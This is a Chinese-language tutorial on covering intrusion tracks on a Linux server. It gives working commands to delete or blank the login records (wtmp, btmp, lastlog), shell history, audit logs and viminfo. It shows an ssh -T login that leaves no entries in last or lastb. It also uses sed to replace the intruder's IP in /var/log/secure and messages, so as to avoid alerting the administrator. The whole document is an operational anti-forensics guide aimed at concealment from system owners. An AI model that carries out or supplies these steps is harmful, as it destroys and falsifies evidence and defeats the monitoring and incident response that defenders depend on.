### 1. 查看登录 ip
```bash
cat /var/log/wtmp
```
![image-20220811103708038](http://images.zabbix.store/markdown/image-20220811103708038.png?markdown)  

**解决方案:**  

```bash
# 更改其中的 ip
vim /var/log/wtmp
# 删除
rm /var/log/wtmp
```

执行`last` 命令的时候，就会看不到当前登录的 `ip` 信息 

```bash
# 显示登录成功的用户名单
$: last
```

### 2. 查看登陆失败的信息

```bash
cat /var/log/btmp
```

因为是二进制文件，根据自己的 `ip` 进行 `grep` 的操作如下:  

```bash
# ip 为，39.156.x.x 的时候，搜 39 或者 156，看下有相同的
cat /var/log/btmp | grep -a 156
```

解决方案同 `1` 中的。  

```bash
# 显示登录失败的用户名单
$: lastb
```

### 3. 清除 Linux 系统历史执行命令

```bash
# 清除
history -c
# 查看历史执行命令，发现已经没有  
history
# 解决方案 2:  使用 echo 清空文件
echo "" > ~/.bash_history
```

### 4. 清理 lastlog 

显示系统中所有用户最近一次登录信息。  

![image-20220811110408556](http://images.zabbix.store/markdown/image-20220811110408556.png?markdown)  

可以直接看到我们的 `ip` 痕迹。  

**解决方案：**  

```bash
# 二进制文件直接删除
rm /var/log/lastlog
```

### 5. 清理其他日志

**/var/log/secure**

```bash
# 在 /var/log/secure 查找你的 ip ， 例如 cat /var/log/secure | grep 36.22.225.1 这样
cat /var/log/secure | grep xx.xx.xx.xx
```

如果有输出，就使用 `vim` 进入删除即可。  

**/var/log/audit/ 目录下**  

```bash
ls /var/log/audit/
```

![image-20220811115745120](http://images.zabbix.store/markdown/image-20220811115745120.png?markdown)

**解决方案:**

```bash
# 空值写入
echo "" > /var/log/audit/audit.log
# 删除
rm /var/log/audit/audit.log
```

其余几个 `audit*.log` 尝试用 `grep` 搜索自己的 `ip`,找到后使用上述解决方案。  

### 6. 不要使用 vim

`vim` 操作文件后，后保留日志，我们来看一下：  

```bash
cat ~/.viminfo
```

找了一些部分修改此文件的命令，未测试，遇事不决，建议直接删除。  

```bash
rm -rf ~/.viminfo
```

### 7. ssh 隐身登录

```bash
ssh -T root@xx.ip.xx.xx /bin/bash -i
# 示例
ssh -T root@172.10.1.168 /bin/bash -i
```

**登录成功后:**  

```bash
$: last # 此命令查不到
$: lastb # 此命令查不到
```

让我们去看下日志:  

```bash
# 存在痕迹
cat /var/log/secure 
```

此时最好不好删除，此文件日志多，直接删除引起管理员注意。  

```bash
# 匹配自己 ip 进行替换
sed -i 's/自己的ip/要换成的ip/g' /var/log/messages
sed -i 's/自己的ip/要换成的ip/g' /var/log/secure
```

上述命令执行完后:  

`cat /var/log/secure ` 后发现 `ip` 已经变为自己想替换成的 `ip` .  

